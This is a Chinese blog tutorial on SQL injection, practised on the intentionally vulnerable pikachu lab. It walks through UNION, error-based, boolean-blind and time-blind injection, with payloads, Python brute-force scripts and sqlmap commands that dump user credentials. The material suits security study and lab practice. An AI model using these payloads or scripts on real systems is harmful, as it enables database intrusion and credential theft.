---
title: '网络安全学习-SQL注入'
tags:
  - 网络安全
readmore: true
abbrlink: e00997cb
date: 2023-02-06 15:39:03
---

### 简介

所谓SQL注入，就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。

<!-- more -->

### 环境搭建

环境使用 pikachu 的靶场，下载地址：https://github.com/zhuifengshaonianhanlu/pikachu

安装方式可自行百度，推荐使用 phpstudy 创建网站，方便快捷。

### 万能查询

通常查询的 sql 语句为

```sql
select username password from users where username = '';
```

如果网站没有做特殊字符的过滤，那么在这个基础上可以构成

```sql
select username password from users where username = '' or 1 = 1 #';
```

通过单引号对 where 进行闭合，并构成永远为真的表达式，后面的单引号使用注释符 # 进行覆盖；这样执行的 sql 语句会直接查询出所有的信息。

在 pikachu 靶场中的 **SQL-Inject -> 字符型注入(get)** 中使用即可得到所有信息。

### union 注入

继续使用**字符型注入**，由万能查询可以得到用户名，这里我们使用 “kobe” 用户作为注入测试

#### 判断字段数

首先我们在使用 union 语句之前，需要判断查询语句中的字段有多少个，使用order by 语句进行判断。

```sql
kobe'order by 2#
```

若正确的查询出数据，则可以判断查询语句中拥有多少字段；

#### 判断回显点

这里我们就可以使用 union 注入，在获取我们想要的信息之前，需要先判断一下显示信息的回显位置在什么地方，通过该语句可以找到回显位置。

```sql
kobe' union select 1, 2 #
```

#### 查询数据库名

使用 mysql 中的 database() 函数

```sql
kobe' union select 1, database() #
```

可以看到在页面中显示出了数据库名称： pikachu

#### 查询数据表名

在 mysql 数据库中 information_schema 数据库 tables 的数据表中保存着所有 mysql 的配置信息，包括所有的数据库，数据表以及它们的字段名，所以直接使用查询语句查询该数据库的所有数据表。

```sql
kobe' union select group_concat(table_name), 2 from information_schema.tables where table_schema = database()#
```

#### 查询 users 表中的所有字段

同样使用上述的数据库，这次使用 colums 数据表即可查询到所有数据表中的所有字段。

```sql
kobe' union select group_concat(column_name), 2 from information_schema.columns 
where table_schema = database() and table_name = 'users'#
```

#### 查询 users 表中的所有信息

假设 username 和 password 就是我们想要的字段，直接查询里面的信息即可

```sql
kobe' union select username, password from users #
```

### 报错注入

报错注入是通过 mysql ，函数执行错误时的会显示报错信息而执行的一种注入。

依然是字符型注入，这里使用 mysql 的 updatexml() 函数，该函数本身是通过 xpath 进行xml 替换，由于xpath 中出现特殊字符就会报错，所以使用该函数作为报错注入的工具。

#### 查询数据库名

concat 是连接函数，用来连接字符串，而在 ASCII 码中 0x7e 这个十六进制代表符号 ~，而波浪线在 xpath 语法中是不存在的，这样就可以通过报错信息得到我们想要的内容。

```sql
kobe' and updatexml(1, concat(0x7e, database()), 1) #
```

#### 查询数据表名

```sql
kobe' and updatexml(1, concat(0x7e, (select group_concat(table_name)
from information_schema.tables where table_schema = database())), 1) #
```

如果因为网页显示有长度限制可以使用 limit 语句来依次显示所有的表名，通过修改 limit 的第一个参数即可显示不同的表名。

```sql
kobe' and updatexml(1, concat(0x7e, (select table_name
from information_schema.tables where table_schema = database() limit 0, 1)), 1) #
```

后续只是替换不同的 sql 语句，和前面内容相同。

### 布尔盲注

盲注是因为单击查询后，页面没有回显字段，且 web 页面返回 true 或 false；

所以构成表达式后再通过脚本不停的执行，进而判断出想要的结果。

打开靶场中的**盲注(base on boolian)**

#### 判断数据库长度

length() 该函数是 mysql 中判断长度的函数。

```sql
kobe' and length(database()) = 7 #
```

若成功返回正确的结果，则代表符合条件，进而继续判断；反之则不符合条件。

python脚本：

```python
# 布尔盲注：获取数据库长度
import requests

ip = 'http://192.168.31.195/'

parameter = "kobe' and length(database()) = %d --+"


for i in range(1, 10):
    url = ip + 'pikachu/vul/sqli/sqli_str.php?name=' + (parameter % i) + "&submit=查询"

    response = requests.get(url)

    html = response.text

    if html.find("您输入的username不存在，请重新输入！") == -1:
        print("The database length is %d" % i)
```

#### 查询数据库名称

使用 substr 对数据库名做分割，并转换成 ascii 码，进而判断对应位置的字符是什么。

使用 ASCII码是因为，浏览器不区分大小写，所以使用ASCII码更能准确地判断字符。

```sql
kobe' and ascii(substr(database(), 1, 1)) = 32 #
```

python 脚本

```python
# 布尔盲注：获取数据库名称
import requests

ip = 'http://192.168.31.195/'

parameter = "kobe' and ascii(substr(database(), %d, 1)) = %d --+"

name = ''

for i in range(1, 8):
    for j in range(32, 128):
        url = ip + 'pikachu/vul/sqli/sqli_str.php?name=' + (parameter % (i, j)) + "&submit=查询"

        response = requests.get(url)

        html = response.text

        if html.find("您输入的username不存在，请重新输入！") == -1:
            name = name + chr(j)
            break

print("The name of the database is " + name)
```

#### 查询数据库表名

```sql
kobe' and ascii(substr((select table_name from information_schema.tables where table_schema = database() limit 0 ,1), 1, 1)) = 104 #
```

python脚本：

````python
# 布尔盲注：获取数据库表名
import threading

import requests

ip = 'http://192.168.31.195/'

parameter = "kobe' and ascii(substr((select table_name " \
            "from information_schema.tables where table_schema=database() limit %d ,1), %d, 1)) = %d --+"

address = 'pikachu/vul/sqli/sqli_blind_b.php?name='

names = ''

# 设置重连次数
requests.DEFAULT_RETRIES = 5


def run(k):
    name = ''
    global names

    for i in range(1, 12):
        for j in range(32, 128):
            url = ip + address + (parameter % (k, i, j)) + "&submit=查询"

            response = requests.get(url)

            html = response.text

            if html.find("您输入的username不存在，请重新输入！") == -1:
                name = name + chr(j)

                print("第%d个数据表名称的第%d位是%s" % (k + 1, i, name))
                break

    names = name + ',' + names


if __name__ == '__main__':

    threads = []
    for k in range(0, 8):
        t = threading.Thread(target=run, args=(k,))
        threads.append(t)

    for t in threads:
        t.start()

    while True:
        # 判断当前线程数
        if len(threading.enumerate()) == 1:
            print("The names of these data tables are " + names)
            break

````

由于循环次数过大，所以使用多线程进行访问。

### 时间盲注

通常因为正确错误返回结果相同，无法进行判断对错，所以使用该注入方法。

使用 mysql 中的 sleep 函数，根据页面的返回时间进行判断是否正确。

```sql
kobe' and if (length(database()) = 7, sleep(3), 0) #
```

python脚本：

```python
# 时间盲注：获取数据库长度

import requests

ip = 'http://192.168.31.195/'

parameter = "kobe' and if (length(database()) = %d, sleep(3), 0) --+"

address = 'pikachu/vul/sqli/sqli_blind_t.php?name='

for i in range(1, 10):
    url = ip + address + (parameter % i) + "&submit=查询"

    response = requests.get(url)

    t = response.elapsed.total_seconds()

    if t > 3:
        print("The database length is %d" % i)
```

### sqlmap的使用

sqlmap 是一款自动化的 sql注入工具，安装 kali 会自带该工具；

不会安装 kali 可以访问这个视频：[【星落】VMware安装kali虚拟机并设置中文语言](https://www.bilibili.com/video/BV1CZ4y167iX/?vd_source=8fa3d847651af32d58750a4129f62419) 

常用命令：

```bash
sqlmap -u "http://192.168.31.195/pikachu/vul/sqli/sqli_str.php?name=kobe&submit=%E6%9F%A5%E8%AF%A2" --current-db
# 爆出当前数据库名称

sqlmap -u "http://192.168.31.195/pikachu/vul/sqli/sqli_str.php?name=1%27%23&submit=%E6%9F%A5%E8%AF%A2" --dbs
# 爆出所有数据库名称

sqlmap -u "http://192.168.31.195/pikachu/vul/sqli/sqli_str.php?name=kobe&submit=%E6%9F%A5%E8%AF%A2" -D pikachu --tables
# 爆出当前数据库中所有表名称

sqlmap -u "http://192.168.31.195/pikachu/vul/sqli/sqli_str.php?name=kobe&submit=%E6%9F%A5%E8%AF%A2" -D pikachu -T users --dump
# 爆出 pikachu 库中 users 数据表中的所有数据

sqlmap -r "1.txt" --current-db
# 根据请求头爆出当前数据库
```
> 参数介绍：
>
> -u	注入的 url；
>
> -D	注入的数据库名称；
>
> -T	注入的数据表名称；
>
> -r	 根据请求头注入；
>
> 当注入点使用 post 请求时，首先通过 BurpSuite 进行抓包，并将抓到的请求头复制到 kali 中，再使用命令即可开始注入；


更多命令请查看官方文档：[官方文档](https://github.com/sqlmapproject/sqlmap/wiki/Usage)



仅供学习交流使用~
